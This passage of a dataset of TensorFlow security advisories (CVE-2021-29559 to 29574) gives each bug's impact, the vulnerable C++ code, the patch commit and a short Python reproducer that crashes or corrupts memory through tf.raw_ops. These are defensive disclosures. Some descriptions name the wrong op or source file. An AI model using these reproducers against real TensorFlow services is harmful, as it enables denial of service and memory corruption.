const int dim = input_tensor.indices().matrix<int64>()(i, split_dim);
int slice_index = GetSliceIndex(dim, split_size, residual);
num_values[slice_index]++;
```

This results in overriding values on the heap.

### Patches
We have patched the issue in GitHub commit [8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31](https://github.com/tensorflow/tensorflow/commit/8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
251,20741,tensorflow,GHSA-59q2-x2qc-4c97,CVE-2021-29559,https://github.com/advisories/GHSA-59q2-x2qc-4c97,low,2021-05-21 14:24:54 UTC,Heap OOB access in unicode ops,"### Impact
An attacker can access data outside of bounds of heap allocated array in `tf.raw_ops.UnicodeEncode`:

```python
import tensorflow as tf

input_values = tf.constant([58], shape=[1], dtype=tf.int32)
input_splits = tf.constant([[81, 101, 0]], shape=[3], dtype=tf.int32)
output_encoding = ""UTF-8""

tf.raw_ops.UnicodeEncode(
    input_values=input_values, input_splits=input_splits,
    output_encoding=output_encoding)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/472c1f12ad9063405737679d4f6bd43094e1d36d/tensorflow/core/kernels/unicode_ops.cc)
assumes that the `input_value`/`input_splits` pair specify a valid sparse tensor.

### Patches
We have patched the issue in GitHub commit [51300ba1cc2f487aefec6e6631fef03b0e08b298](https://github.com/tensorflow/tensorflow/commit/51300ba1cc2f487aefec6e6631fef03b0e08b298).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
252,20741,tensorflow,GHSA-8gv3-57p6-g35r,CVE-2021-29560,https://github.com/advisories/GHSA-8gv3-57p6-g35r,low,2021-05-21 14:24:57 UTC,Heap buffer overflow in `RaggedTensorToTensor`,"### Impact
An attacker can cause a heap buffer overflow in `tf.raw_ops.RaggedTensorToTensor`:

```python
import tensorflow as tf

shape = tf.constant([10, 10], shape=[2], dtype=tf.int64)
values = tf.constant(0, shape=[1], dtype=tf.int64)
default_value = tf.constant(0, dtype=tf.int64)
l = [849, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
row = tf.constant(l, shape=[5, 43], dtype=tf.int64)
rows = [row]
types = ['ROW_SPLITS']

tf.raw_ops.RaggedTensorToTensor(
    shape=shape, values=values, default_value=default_value,
    row_partition_tensors=rows, row_partition_types=types) 
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/d94227d43aa125ad8b54115c03cece54f6a1977b/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L219-L222) uses the same index to access two arrays in parallel:

```cc
for (INDEX_TYPE i = 0; i < row_split_size - 1; ++i) {
  INDEX_TYPE row_length = row_split(i + 1) - row_split(i);
  INDEX_TYPE real_length = std::min(output_size, row_length);
  INDEX_TYPE parent_output_index_current = parent_output_index[i];
  ...
}
```

Since the user controls the shape of the input arguments, an attacker could trigger a heap OOB access when `parent_output_index` is shorter than `row_split`.

### Patches
We have patched the issue in GitHub commit [a84358aa12f0b1518e606095ab9cfddbf597c121](https://github.com/tensorflow/tensorflow/commit/a84358aa12f0b1518e606095ab9cfddbf597c121).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
253,20741,tensorflow,GHSA-gvm4-h8j3-rjrq,CVE-2021-29561,https://github.com/advisories/GHSA-gvm4-h8j3-rjrq,low,2021-05-21 14:24:59 UTC,CHECK-fail in `LoadAndRemapMatrix`,"### Impact
An attacker can cause a denial of service by exploiting a `CHECK`-failure coming from `tf.raw_ops.LoadAndRemapMatrix`:
    
```python
import tensorflow as tf

ckpt_path = tf.constant([], shape=[0], dtype=tf.string)
old_tensor_name = tf.constant("""")
row_remapping = tf.constant([], shape=[0], dtype=tf.int64)
col_remapping = tf.constant([1], shape=[1], dtype=tf.int64)
initializing_values = tf.constant(1.0)

tf.raw_ops.LoadAndRemapMatrix(
    ckpt_path=ckpt_path, old_tensor_name=old_tensor_name,
    row_remapping=row_remapping, col_remapping=col_remapping,
    initializing_values=initializing_values, num_rows=0, num_cols=1)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/d94227d43aa125ad8b54115c03cece54f6a1977b/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L219-L222) assumes that the `ckpt_path` is always a valid scalar.
  
```cc
const string& ckpt_path = ckpt_path_t->scalar<tstring>()();
```

However, an attacker can send any other tensor as the first argument of `LoadAndRemapMatrix`. This would cause the rank `CHECK` in `scalar<T>()()` to trigger and terminate the process.

### Patches
We have patched the issue in GitHub commit [77dd114513d7796e1e2b8aece214a380af26fbf4](https://github.com/tensorflow/tensorflow/commit/77dd114513d7796e1e2b8aece214a380af26fbf4).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
254,20741,tensorflow,GHSA-36vm-xw34-x4pj,CVE-2021-29562,https://github.com/advisories/GHSA-36vm-xw34-x4pj,low,2021-05-21 14:25:02 UTC,CHECK-fail in `tf.raw_ops.IRFFT`,"### Impact
An attacker can cause a denial of service by exploiting a `CHECK`-failure coming from the implementation of `tf.raw_ops.IRFFT`:
    
```python
import tensorflow as tf

values = [-10.0] * 130
values[0] = -9.999999999999995
inputs = tf.constant(values, shape=[10, 13], dtype=tf.float32)
inputs = tf.cast(inputs, dtype=tf.complex64)
fft_length = tf.constant([0], shape=[1], dtype=tf.int32)

tf.raw_ops.IRFFT(input=inputs, fft_length=fft_length)
``` 
    
The above example causes Eigen code to operate on an empty matrix. This triggers on an assertion and causes program termination.

### Patches
We have patched the issue in GitHub commit [1c56f53be0b722ca657cbc7df461ed676c8642a2](https://github.com/tensorflow/tensorflow/commit/1c56f53be0b722ca657cbc7df461ed676c8642a2).
  
The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team. ",pip
255,20741,tensorflow,GHSA-ph87-fvjr-v33w,CVE-2021-29563,https://github.com/advisories/GHSA-ph87-fvjr-v33w,low,2021-05-21 14:25:05 UTC,CHECK-fail in `tf.raw_ops.RFFT`,"### Impact
An attacker can cause a denial of service by exploiting a `CHECK`-failure coming from the implementation of `tf.raw_ops.RFFT`:
    
```python
import tensorflow as tf

inputs = tf.constant([1], shape=[1], dtype=tf.float32)
fft_length = tf.constant([0], shape=[1], dtype=tf.int32)

tf.raw_ops.RFFT(input=inputs, fft_length=fft_length)
```

The above example causes Eigen code to operate on an empty matrix. This triggers on an assertion and causes program termination.
    
### Patches
We have patched the issue in GitHub commit [31bd5026304677faa8a0b77602c6154171b9aec1](https://github.com/tensorflow/tensorflow/commit/31bd5026304677faa8a0b77602c6154171b9aec1).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. 

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
256,20741,tensorflow,GHSA-75f6-78jr-4656,CVE-2021-29564,https://github.com/advisories/GHSA-75f6-78jr-4656,low,2021-05-21 14:25:08 UTC,Null pointer dereference in `EditDistance`,"### Impact
An attacker can trigger a null pointer dereference in the implementation of `tf.raw_ops.EditDistance`: 
    
```python
import tensorflow as tf

hypothesis_indices = tf.constant([247, 247, 247], shape=[1, 3], dtype=tf.int64)
hypothesis_values = tf.constant([-9.9999], shape=[1], dtype=tf.float32)
hypothesis_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)
truth_indices = tf.constant([], shape=[0, 3], dtype=tf.int64)
truth_values = tf.constant([], shape=[0], dtype=tf.float32)
truth_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)

tf.raw_ops.EditDistance(
    hypothesis_indices=hypothesis_indices, hypothesis_values=hypothesis_values,
    hypothesis_shape=hypothesis_shape, truth_indices=truth_indices,
    truth_values=truth_values, truth_shape=truth_shape, normalize=True)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/79865b542f9ffdc9caeb255631f7c56f1d4b6517/tensorflow/core/kernels/edit_distance_op.cc#L103-L159) has incomplete validation of the input parameters.

In the above scenario, an attacker causes an allocation of an empty tensor for the output:

```cc
OP_REQUIRES_OK(ctx, ctx->allocate_output(""output"", output_shape, &output));
auto output_t = output->flat<float>();
output_t.setZero();
```

Because `output_shape` has 0 elements, the result of `output->flat<T>()` has an empty buffer, so calling `setZero` would result in a null dereference.

### Patches
We have patched the issue in GitHub commit [f4c364a5d6880557f6f5b6eb5cee2c407f0186b3](https://github.com/tensorflow/tensorflow/commit/f4c364a5d6880557f6f5b6eb5cee2c407f0186b3).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
257,20741,tensorflow,GHSA-r6pg-pjwc-j585,CVE-2021-29565,https://github.com/advisories/GHSA-r6pg-pjwc-j585,low,2021-05-21 14:25:11 UTC,Null pointer dereference in `SparseFillEmptyRows`,"### Impact
An attacker can trigger a null pointer dereference in the implementation of `tf.raw_ops.SparseFillEmptyRows`:

```python
import tensorflow as tf

indices = tf.constant([], shape=[0, 0], dtype=tf.int64)
values = tf.constant([], shape=[0], dtype=tf.int64)
dense_shape = tf.constant([], shape=[0], dtype=tf.int64)
default_value = 0
    
tf.raw_ops.SparseFillEmptyRows(
    indices=indices, values=values, dense_shape=dense_shape,
    default_value=default_value)
```

This is because of missing [validation](https://github.com/tensorflow/tensorflow/blob/fdc82089d206e281c628a93771336bf87863d5e8/tensorflow/core/kernels/sparse_fill_empty_rows_op.cc#L230-L231) that was covered under a `TODO`. If the `dense_shape` tensor is empty, then `dense_shape_t.vec<>()` would cause a null pointer dereference in the implementation of the op:

```cc
template <typename T, typename Tindex>
struct SparseFillEmptyRows<CPUDevice, T, Tindex> {
  Status operator()(OpKernelContext* context, const Tensor& default_value_t,
                    const Tensor& indices_t, const Tensor& values_t,
                    const Tensor& dense_shape_t,
                    typename AsyncOpKernel::DoneCallback done) {
    ...
    const auto dense_shape = dense_shape_t.vec<Tindex>();
    ... 
  }
}
``` 

### Patches
We have patched the issue in GitHub commit [faa76f39014ed3b5e2c158593b1335522e573c7f](https://github.com/tensorflow/tensorflow/commit/faa76f39014ed3b5e2c158593b1335522e573c7f).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
258,20741,tensorflow,GHSA-pvrc-hg3f-58r6,CVE-2021-29566,https://github.com/advisories/GHSA-pvrc-hg3f-58r6,low,2021-05-21 14:25:13 UTC,Heap OOB access in `Dilation2DBackpropInput`,"### Impact
An attacker can write outside the bounds of heap allocated arrays by passing invalid arguments to `tf.raw_ops.Dilation2DBackpropInput`:

```python
import tensorflow as tf
    
input_tensor = tf.constant([1.1] * 81, shape=[3, 3, 3, 3], dtype=tf.float32)
filter = tf.constant([], shape=[0, 0, 3], dtype=tf.float32)
out_backprop = tf.constant([1.1] * 1062, shape=[3, 2, 59, 3], dtype=tf.float32)

tf.raw_ops.Dilation2DBackpropInput(
  input=input_tensor, filter=filter, out_backprop=out_backprop, 
  strides=[1, 40, 1, 1], rates=[1, 56, 56, 1], padding='VALID')
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/afd954e65f15aea4d438d0a219136fc4a63a573d/tensorflow/core/kernels/dilation_ops.cc#L321-L322) does not validate before writing to the output array.
  
```cc               
in_backprop(b, h_in_max, w_in_max, d) += out_backprop(b, h_out, w_out, d);
```                 
    
The values for `h_out` and `w_out` are guaranteed to be in range for `out_backprop` (as they are loop indices bounded by the size of the array). However, there are no similar guarantees relating `h_in_max`/`w_in_max` and `in_backprop`.

### Patches
We have patched the issue in GitHub commit [3f6fe4dfef6f57e768260b48166c27d148f3015f](https://github.com/tensorflow/tensorflow/commit/3f6fe4dfef6f57e768260b48166c27d148f3015f).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
259,20741,tensorflow,GHSA-wp3c-xw9g-gpcg,CVE-2021-29567,https://github.com/advisories/GHSA-wp3c-xw9g-gpcg,low,2021-05-21 14:25:16 UTC,Lack of validation in `SparseDenseCwiseMul`,"### Impact
Due to lack of validation in `tf.raw_ops.SparseDenseCwiseMul`, an attacker can trigger denial of service via `CHECK`-fails or accesses to outside the bounds of heap allocated data:

```python
import tensorflow as tf

indices = tf.constant([], shape=[10, 0], dtype=tf.int64)
values = tf.constant([], shape=[0], dtype=tf.int64)
shape = tf.constant([0, 0], shape=[2], dtype=tf.int64)
dense = tf.constant([], shape=[0], dtype=tf.int64)
  
tf.raw_ops.SparseDenseCwiseMul(
    sp_indices=indices, sp_values=values, sp_shape=shape, dense=dense)
```

Since the [implementation](https://github.com/tensorflow/tensorflow/blob/38178a2f7a681a7835bb0912702a134bfe3b4d84/tensorflow/core/kernels/sparse_dense_binary_op_shared.cc#L68-L80) only validates the rank of the input arguments but no [constraints between dimensions](https://www.tensorflow.org/api_docs/python/tf/raw_ops/SparseDenseCwiseMul), an attacker can abuse them to trigger internal `CHECK` assertions (and cause program termination, denial of service) or to write to memory outside of bounds of heap allocated tensor buffers.

### Patches
We have patched the issue in GitHub commit [7ae2af34087fb4b5c8915279efd03da3b81028bc](https://github.com/tensorflow/tensorflow/commit/7ae2af34087fb4b5c8915279efd03da3b81028bc).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
260,20741,tensorflow,GHSA-4p4p-www8-8fv9,CVE-2021-29568,https://github.com/advisories/GHSA-4p4p-www8-8fv9,low,2021-05-21 14:25:19 UTC,Reference binding to null in `ParameterizedTruncatedNormal`,"### Impact
An attacker can trigger undefined behavior by binding to null pointer in `tf.raw_ops.ParameterizedTruncatedNormal`:

```python
import tensorflow as tf
    
shape = tf.constant([], shape=[0], dtype=tf.int32)
means = tf.constant((1), dtype=tf.float32)
stdevs = tf.constant((1), dtype=tf.float32)
minvals = tf.constant((1), dtype=tf.float32)
maxvals = tf.constant((1), dtype=tf.float32)
  
tf.raw_ops.ParameterizedTruncatedNormal(
  shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/3f6fe4dfef6f57e768260b48166c27d148f3015f/tensorflow/core/kernels/parameterized_truncated_normal_op.cc#L630) does not validate input arguments before accessing the first element of `shape`:

```cc
int32 num_batches = shape_tensor.flat<int32>()(0);
``` 

If `shape` argument is empty, then `shape_tensor.flat<T>()` is an empty array.

### Patches
We have patched the issue in GitHub commit [5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8](https://github.com/tensorflow/tensorflow/commit/5e52ef5a461570cfb68f3bdbbebfe972cb4e0fd8).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
261,20741,tensorflow,GHSA-3h8m-483j-7xxm,CVE-2021-29569,https://github.com/advisories/GHSA-3h8m-483j-7xxm,low,2021-05-21 14:25:22 UTC,Heap out of bounds read in `RequantizationRange`,"### Impact
The implementation of `tf.raw_ops.MaxPoolGradWithArgmax` can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:

```python
import tensorflow as tf

input = tf.constant([1], shape=[1], dtype=tf.qint32) 
input_max = tf.constant([], dtype=tf.float32)
input_min = tf.constant([], dtype=tf.float32)

tf.raw_ops.RequantizationRange(input=input, input_min=input_min, input_max=input_max)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/ac328eaa3870491ababc147822cd04e91a790643/tensorflow/core/kernels/requantization_range_op.cc#L49-L50) assumes that the `input_min` and `input_max` tensors have at least one element, as it accesses the first element in two arrays:

```cc
const float input_min_float = ctx->input(1).flat<float>()(0);
const float input_max_float = ctx->input(2).flat<float>()(0);
```

If the tensors are empty, `.flat<T>()` is an empty object, backed by an empty array. Hence, accesing even the 0th element is a read outside the bounds.

### Patches
We have patched the issue in GitHub commit [ef0c008ee84bad91ec6725ddc42091e19a30cf0e](https://github.com/tensorflow/tensorflow/commit/ef0c008ee84bad91ec6725ddc42091e19a30cf0e).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
262,20741,tensorflow,GHSA-545v-42p7-98fq,CVE-2021-29570,https://github.com/advisories/GHSA-545v-42p7-98fq,low,2021-05-21 14:25:25 UTC,Heap out of bounds read in `MaxPoolGradWithArgmax`,"### Impact
The implementation of `tf.raw_ops.MaxPoolGradWithArgmax` can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:

```python
import tensorflow as tf

input = tf.constant([10.0, 10.0, 10.0], shape=[1, 1, 3, 1], dtype=tf.float32)
grad = tf.constant([10.0, 10.0, 10.0, 10.0], shape=[1, 1, 1, 4], dtype=tf.float32)
argmax = tf.constant([1], shape=[1], dtype=tf.int64)
ksize = [1, 1, 1, 1]
strides = [1, 1, 1, 1]
  
tf.raw_ops.MaxPoolGradWithArgmax(
  input=input, grad=grad, argmax=argmax, ksize=ksize, strides=strides,
  padding='SAME', include_batch_in_index=False)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/ef0c008ee84bad91ec6725ddc42091e19a30cf0e/tensorflow/core/kernels/maxpooling_op.cc#L1016-L1017) uses the same value to index in two different arrays but there is no guarantee that the sizes are identical. 

### Patches
We have patched the issue in GitHub commit [dcd7867de0fea4b72a2b34bd41eb74548dc23886](https://github.com/tensorflow/tensorflow/commit/dcd7867de0fea4b72a2b34bd41eb74548dc23886).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. 

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
263,20741,tensorflow,GHSA-whr9-vfh2-7hm6,CVE-2021-29571,https://github.com/advisories/GHSA-whr9-vfh2-7hm6,moderate,2021-05-21 14:25:28 UTC,Memory corruption in `DrawBoundingBoxesV2`,"### Impact
The implementation of `tf.raw_ops.MaxPoolGradWithArgmax` can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:

```python
import tensorflow as tf

images = tf.fill([10, 96, 0, 1], 0.)
boxes = tf.fill([10, 53, 0], 0.)
colors = tf.fill([0, 1], 0.)

tf.raw_ops.DrawBoundingBoxesV2(images=images, boxes=boxes, colors=colors)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/31bd5026304677faa8a0b77602c6154171b9aec1/tensorflow/core/kernels/image/draw_bounding_box_op.cc#L116-L130) assumes that the last element of `boxes` input is 4, as required by [the op](https://www.tensorflow.org/api_docs/python/tf/raw_ops/DrawBoundingBoxesV2). Since this is not checked attackers passing values less than 4 can write outside of bounds of heap allocated objects and cause memory corruption:

```cc 
const auto tboxes = boxes.tensor<T, 3>();
for (int64 bb = 0; bb < num_boxes; ++bb) {
  ...
  const int64 min_box_row = static_cast<float>(tboxes(b, bb, 0)) * (height - 1);
  const int64 max_box_row = static_cast<float>(tboxes(b, bb, 2)) * (height - 1);
  const int64 min_box_col = static_cast<float>(tboxes(b, bb, 1)) * (width - 1);
  const int64 max_box_col = static_cast<float>(tboxes(b, bb, 3)) * (width - 1);
  ...
}
``` 

If the last dimension in `boxes` is less than 4, accesses similar to `tboxes(b, bb, 3)` will access data outside of bounds. Further during code execution there are also writes to these indices.

### Patches
We have patched the issue in GitHub commit [79865b542f9ffdc9caeb255631f7c56f1d4b6517](https://github.com/tensorflow/tensorflow/commit/79865b542f9ffdc9caeb255631f7c56f1d4b6517).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
264,20741,tensorflow,GHSA-5gqf-456p-4836,CVE-2021-29572,https://github.com/advisories/GHSA-5gqf-456p-4836,low,2021-05-21 14:25:31 UTC,Reference binding to nullptr in `SdcaOptimizer`,"### Impact
The implementation of `tf.raw_ops.SdcaOptimizer` triggers undefined behavior due to dereferencing a null pointer:

```python
import tensorflow as tf

sparse_example_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]
sparse_feature_indices = [tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64), tf.constant((0), dtype=tf.int64)]
sparse_feature_values = []

dense_features = []
dense_weights = []

example_weights = tf.constant((0.0), dtype=tf.float32)
example_labels = tf.constant((0.0), dtype=tf.float32)

sparse_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]
sparse_weights = [tf.constant((0.0), dtype=tf.float32), tf.constant((0.0), dtype=tf.float32)]
  
example_state_data = tf.constant([0.0, 0.0, 0.0, 0.0], shape=[1, 4], dtype=tf.float32)
  
tf.raw_ops.SdcaOptimizer(
  sparse_example_indices=sparse_example_indices,
  sparse_feature_indices=sparse_feature_indices,
  sparse_feature_values=sparse_feature_values, dense_features=dense_features,
  example_weights=example_weights, example_labels=example_labels, 
  sparse_indices=sparse_indices, sparse_weights=sparse_weights, 
  dense_weights=dense_weights, example_state_data=example_state_data,
  loss_type=""logistic_loss"", l1=0.0, l2=0.0, num_loss_partitions=1,
  num_inner_iterations=1, adaptative=False)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/60a45c8b6192a4699f2e2709a2645a751d435cc3/tensorflow/core/kernels/sdca_internal.cc) does not validate that the user supplied arguments satisfy all [constraints expected by the op](https://www.tensorflow.org/api_docs/python/tf/raw_ops/SdcaOptimizer).

### Patches
We have patched the issue in GitHub commit [f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb](https://github.com/tensorflow/tensorflow/commit/f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
265,20741,tensorflow,GHSA-9vpm-rcf4-9wqw,CVE-2021-29573,https://github.com/advisories/GHSA-9vpm-rcf4-9wqw,low,2021-05-21 14:26:07 UTC,Division by 0 in `MaxPoolGradWithArgmax`,"### Impact
The implementation of `tf.raw_ops.MaxPoolGradWithArgmax` is vulnerable to a division by 0:

```python
import tensorflow as tf

input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)
grad = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)
argmax = tf.constant([], shape=[0], dtype=tf.int64)
ksize = [1, 1, 1, 1]
strides = [1, 1, 1, 1]

tf.raw_ops.MaxPoolGradWithArgmax(
  input=input, grad=grad, argmax=argmax, ksize=ksize, strides=strides,
  padding='SAME', include_batch_in_index=False)
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/279bab6efa22752a2827621b7edb56a730233bd8/tensorflow/core/kernels/maxpooling_op.cc#L1033-L1034) fails to validate that the batch dimension of the tensor is non-zero, before dividing by this quantity.

### Patches
We have patched the issue in GitHub commit [376c352a37ce5a68b721406dc7e77ac4b6cf483d](https://github.com/tensorflow/tensorflow/commit/376c352a37ce5a68b721406dc7e77ac4b6cf483d).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
266,20741,tensorflow,GHSA-828x-qc2p-wprq,CVE-2021-29574,https://github.com/advisories/GHSA-828x-qc2p-wprq,low,2021-05-21 14:26:10 UTC,Undefined behavior in `MaxPool3DGradGrad`,"### Impact
The implementation of `tf.raw_ops.MaxPool3DGradGrad` exhibits undefined behavior by dereferencing null pointers backing attacker-supplied empty tensors:

```python
import tensorflow as tf

orig_input = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
orig_output = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
grad = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)
